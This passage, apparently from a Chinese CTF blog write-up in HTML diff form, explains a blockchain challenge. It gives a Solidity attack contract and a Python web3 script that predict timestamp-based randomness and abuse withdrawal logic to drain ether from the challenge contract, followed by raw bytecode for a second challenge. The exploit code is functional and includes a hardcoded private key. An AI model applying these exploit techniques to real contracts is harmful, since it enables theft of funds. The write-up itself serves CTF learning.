class="hljs-keyword">uint</span> amount = PlayerPool[_to];<br>            PlayerPool[_to] = <span class="hljs-number">0</span>;<br>            sendValue(payable(_to), amount);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawFirstWin</span><span class="hljs-params">()</span> <span class="hljs-title">external</span> </span>&#123;<br>        <span class="hljs-keyword">require</span>(!GetMoney[msg.sender]);<br>        PlayerPool[msg.sender] = PlayerPool[msg.sender] + <span class="hljs-number">1</span> ether;<br>        withdrawMoney(msg.sender);<br>        GetMoney[msg.sender] = <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isSolved</span><span class="hljs-params">()</span> <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> <span class="hljs-params">(<span class="hljs-keyword">bool</span>)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> address(this).balance == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    receive() external payable &#123;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>通过随机数预测调用三次<code>revealResult</code>函数，即可满足<code>PlayerWins[_to] &gt;= 3</code>，然后直接调用<code>withdrawMoney</code>将<code>PlayerPool</code>清空，但此时<code>PlayerWins[_to] &gt;= 3</code>是仍然满足的，最后调用<code>withdrawFirstWin</code>即可让<code>PlayerPool[msg.sender] + 1</code>然后会通过<code>sendValue</code>转账1eth，从而从题目合约账户中偷取一个eth。</p>
+<p>但是有个弊端就是必须得部署五个攻击合约，因为存在<code>GetMoney</code>限制，所以每个攻击攻击多写个转账就行，一个攻击合约打完转3eth给下一个就不用从水龙头申请15个eth了。</p>
+<p>攻击合约</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">pragma solidity ^<span class="hljs-number">0.8</span>.<span class="hljs-number">7</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract exp &#123;<br>    uint public num = <span class="hljs-number">0</span>;<br>    uint public guess;<br>    uint public PlayerWins;<br>    <span class="hljs-built_in">bool</span> public status = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">bool</span> public flag = <span class="hljs-literal">false</span>;<br><br>    address payable   addr = payable (<span class="hljs-number">0xC8cDC01E6Fb2a021d2C7C4Fa97bFC2ddB73D5e90</span>);<br>    GuessGame GuessGame_contract = <span class="hljs-constructor">GuessGame(<span class="hljs-params">addr</span>)</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-constructor">RandomCoin()</span> <span class="hljs-keyword">private</span> view returns (uint) &#123;<br>        return uint(keccak256(abi.encode<span class="hljs-constructor">Packed(<span class="hljs-params">block</span>.<span class="hljs-params">timestamp</span> ^ 0x1234567)</span>)) % <span class="hljs-number">2</span>;<br>    &#125;<br>    constructor<span class="hljs-literal">()</span> payable &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> setguess<span class="hljs-literal">()</span> public returns (uint)&#123;<br>        guess = <span class="hljs-constructor">RandomCoin()</span>;<br>        <span class="hljs-keyword">if</span> (guess ==<span class="hljs-number">0</span><span class="hljs-operator"> || </span>guess<span class="hljs-operator"> == </span><span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GuessGame_contract</span>.</span></span>guess&#123;value:<span class="hljs-number">1</span> ether&#125;(guess);<br>        &#125;<br>        return guess;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> get<span class="hljs-constructor">Result()</span> public returns(<span class="hljs-built_in">bool</span>)&#123;<br>        <span class="hljs-keyword">if</span>(guess<span class="hljs-operator"> == </span><span class="hljs-constructor">RandomCoin()</span>)&#123;<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GuessGame_contract</span>.</span></span>reveal<span class="hljs-constructor">Result()</span>;<br>            return <span class="hljs-literal">true</span>;<br>        &#125;<br>        return  <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">function</span> set<span class="hljs-constructor">PlayerWins()</span> public &#123;<br>        <span class="hljs-keyword">for</span> (uint j =<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">3</span>;j++)&#123;<br>            setguess<span class="hljs-literal">()</span>;<br>            get<span class="hljs-constructor">Result()</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">function</span> get<span class="hljs-constructor">PlayerWins()</span> public &#123;<br>        PlayerWins =  GuessGame_contract.<span class="hljs-constructor">Winer()</span>;<br>    &#125;<br>    <span class="hljs-keyword">function</span> getflag<span class="hljs-literal">()</span> public &#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GuessGame_contract</span>.</span></span>withdraw<span class="hljs-constructor">FirstWin()</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> transfer(address payable <span class="hljs-keyword">to</span>,uint amount)public &#123;<br>        require(address(this).balance &gt;= amount);<br>        (<span class="hljs-built_in">bool</span> success, ) = <span class="hljs-keyword">to</span>.call&#123;value: amount&#125;(<span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">function</span> attack<span class="hljs-literal">()</span> public &#123;<br>        set<span class="hljs-constructor">PlayerWins()</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GuessGame_contract</span>.</span></span>withdraw<span class="hljs-constructor">Money(<span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>);<br>        getflag<span class="hljs-literal">()</span>;<br>    &#125;<br><br>    receive<span class="hljs-literal">()</span> <span class="hljs-keyword">external</span> payable &#123;<br>    &#125;<br><br><br>&#125;<br><br><br></code></pre></div></td></tr></table></figure>
+
+
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> solcx<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><span class="hljs-keyword">from</span> solcx <span class="hljs-keyword">import</span> compile_files<br><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3,HTTPProvider<br><span class="hljs-keyword">from</span> hexbytes <span class="hljs-keyword">import</span> *<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_tx</span>(<span class="hljs-params">chainID, to, data, value</span>):</span><br>    <span class="hljs-comment"># print(web3.eth.gasPrice)</span><br>    <span class="hljs-comment"># print(web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)))</span><br>    txn = &#123;<br>        <span class="hljs-string">&#x27;chainId&#x27;</span>: chainID,<br>        <span class="hljs-string">&#x27;from&#x27;</span>: Web3.toChecksumAddress(account_address),<br>        <span class="hljs-string">&#x27;to&#x27;</span>: to,<br>        <span class="hljs-string">&#x27;gasPrice&#x27;</span>: web3.eth.gasPrice ,<br>        <span class="hljs-string">&#x27;gas&#x27;</span>: <span class="hljs-number">3000000</span>,<br>        <span class="hljs-string">&#x27;nonce&#x27;</span>: web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)) ,<br>        <span class="hljs-string">&#x27;value&#x27;</span>: Web3.toWei(value, <span class="hljs-string">&#x27;ether&#x27;</span>),<br>        <span class="hljs-string">&#x27;data&#x27;</span>: data,<br>    &#125;<br>    <span class="hljs-comment"># print(txn)</span><br>    <span class="hljs-keyword">return</span> txn<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign_and_send</span>(<span class="hljs-params">txn</span>):</span><br>    signed_txn = web3.eth.account.signTransaction(txn, private_key)<br>    txn_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction).<span class="hljs-built_in">hex</span>()<br>    txn_receipt = web3.eth.waitForTransactionReceipt(txn_hash)<br>    <span class="hljs-comment"># print(&quot;txn_hash=&quot;, txn_hash)</span><br>    <span class="hljs-keyword">return</span> txn_receipt<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deploy_attack</span>(<span class="hljs-params">value</span>):</span><br>    compiled_sol = compile_files([<span class="hljs-string">&quot;exp.sol&quot;</span>],output_values=[<span class="hljs-string">&quot;abi&quot;</span>, <span class="hljs-string">&quot;bin&quot;</span>],solc_version=<span class="hljs-string">&quot;0.8.7&quot;</span>)<br>    data = compiled_sol[<span class="hljs-string">&#x27;exp.sol:exp&#x27;</span>][<span class="hljs-string">&#x27;bin&#x27;</span>]<br>    txn = generate_tx(chain_id, <span class="hljs-string">&#x27;&#x27;</span>, data, value)<br>    txn_receipt = sign_and_send(txn)<br>    attack_abi = compiled_sol[<span class="hljs-string">&#x27;exp.sol:exp&#x27;</span>][<span class="hljs-string">&#x27;abi&#x27;</span>]<br>    <span class="hljs-comment"># print(txn_receipt)</span><br>    <span class="hljs-keyword">if</span> txn_receipt[<span class="hljs-string">&#x27;status&#x27;</span>] == <span class="hljs-number">1</span>:<br>        attack_address = txn_receipt[<span class="hljs-string">&#x27;contractAddress&#x27;</span>]<br>        <span class="hljs-keyword">return</span> attack_address,attack_abi<br>    <span class="hljs-keyword">else</span>:<br>        exit(<span class="hljs-number">0</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getAccountBalance</span>(<span class="hljs-params">accountAddress</span>):</span><br>    checksum_address = web3.toChecksumAddress(accountAddress)<br>    balance = web3.eth.getBalance(checksum_address)<br>    <span class="hljs-keyword">return</span> balance<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solcx.install_solc(<span class="hljs-string">&#x27;0.8.7&#x27;</span>)<br>    account_address = <span class="hljs-string">&quot;0x050b2d13cd124d4B77be29D1782ef54Cf42b3D14&quot;</span><br>    web3=Web3(HTTPProvider(<span class="hljs-string">&quot;http://162.14.80.206:8545/&quot;</span>))<br>    private_key = <span class="hljs-string">&quot;0xf049d473bfd05041bb520f1b2769f2c0834b379a53ae75a96f144f330f2f02c9&quot;</span><br>    chain_id = <span class="hljs-number">45267</span><br>    targetContractAddress = <span class="hljs-string">&quot;0x1ca2135427471686C3e4FD402eEf46f5418f04De&quot;</span><br>    <span class="hljs-comment"># key=web3.eth.account.create()</span><br>    <span class="hljs-comment"># print(hex(bytes_to_long(key.privateKey)))</span><br>    <span class="hljs-comment"># account= web3.eth.account.from_key(&#x27;0x719e289ff8306c4e9ff66476bf35889e24eaa475c80878a2a42c760efaed2134&#x27;)</span><br>    <span class="hljs-comment"># address  = &quot;0x1ca2135427471686C3e4FD402eEf46f5418f04De&quot;</span><br><br>    <span class="hljs-comment"># calc signature</span><br>    attack_address,attack_abi = deploy_attack(<span class="hljs-number">3</span>)<br>    attack_instance = web3.eth.contract(address=attack_address, abi=attack_abi)<br>    <span class="hljs-built_in">print</span>(attack_instance.all_functions())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] attack_address is &quot;</span> + attack_address)  <span class="hljs-comment"># 0x3bDE5c8E8FA4242EF48117638E3905CF771E9962</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] attack_address&#x27;s balance is &quot;</span> + <span class="hljs-built_in">str</span>(web3.eth.getBalance(attack_address)))<br><br><br>    <span class="hljs-comment"># attack()</span><br>    functionSign = HexBytes(web3.sha3(text=<span class="hljs-string">&#x27;attack()&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    setaccount_addr = generate_tx(chain_id, attack_address, functionSign, <span class="hljs-number">0</span>)<br>    sign_and_send(setaccount_addr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] targetContract&#x27;s balance is &quot;</span> + <span class="hljs-built_in">str</span>(getAccountBalance(targetContractAddress)))<br><br>    <span class="hljs-comment">#transfer()</span><br>    <span class="hljs-comment"># attack_address = &quot;0x07cD3AD7421469F694eB8a5Fe261Bab180fd360F&quot;</span><br>    <span class="hljs-comment"># functionSign = &quot;0xa9059cbb000000000000000000000000&quot; + account_address[2:] +&quot;00000000000000000000000000000000000000000000000029a2241af62c0000&quot;</span><br>    <span class="hljs-comment"># account_addr = generate_tx(chain_id, attack_address, functionSign, 0)</span><br>    <span class="hljs-comment"># sign_and_send(account_addr)</span><br>    <span class="hljs-comment"># print(&quot;[+] account&#x27;s balance is &quot; + str(getAccountBalance(account_address)))</span><br>    <span class="hljs-comment"># print(&quot;[+] attack_address&#x27;s balance is &quot; + str(web3.eth.getBalance(attack_address)))</span><br></code></pre></div></td></tr></table></figure>
+
+<p><img src="http://39.107.239.30:3000/uploads/b909f311-7856-4cda-9fe8-52403e8cc7e8.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="元宇宙大师"><a href="#元宇宙大师" class="headerlink" title="元宇宙大师"></a>元宇宙大师</h2><p>在blockscout里面搜到合约bytecode，反编译逆向，后面没咋看明白。</p>
+<figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns"><span class="hljs-number">0</span>x608060405234801561001057600080fd5b506004361061002f5760003560e01c8063a74c2bb61461003257610030565b5b005b61003a610051565b6040516100489291906101dd565b60405180910390f35b6000606060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660018080546100849061023c565b80601f01602080910402602001604051908101604052809291908181526020018280546100b09061023c565b80156100fd5780601f106100d2576101008083540402835291602001916100fd565b820191906000526020600020905b8154815290600101906020018083116100e057829003601f168201915b50505050509050915091509091565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101378261010c565b9050919050565b6101478161012c565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561018757808201518184015260208101905061016c565b60008484015250505050565b6000601f19601f8301169050919050565b60006101af8261014d565b6101b98185610158565b93506101c9818560208601610169565b6101d281610193565b840191505092915050565b60006040820190506101f2600083018561013e565b818103602083015261020481846101a4565b90509392505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b6000600282049050600182168061025457607f821691505b6020821081036102675761026661020d565b5b5091905056fea2646970667358221220c7e58fd4fd1c91003b152185ccdbf061b860f37b1b8d270f05fca3e2d62b7c7f64736f6c63<span class="hljs-number">430008110033</span><br></code></pre></div></td></tr></table></figure>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/blockchain/">blockchain</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/18/2023-2-18-Kerberos%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E4%B8%80%E4%B9%8B%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kerberos协议相关攻击一之委派攻击学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/08/2023-2-8-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/">
+                        <span class="hidden-mobile">红日靶场1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
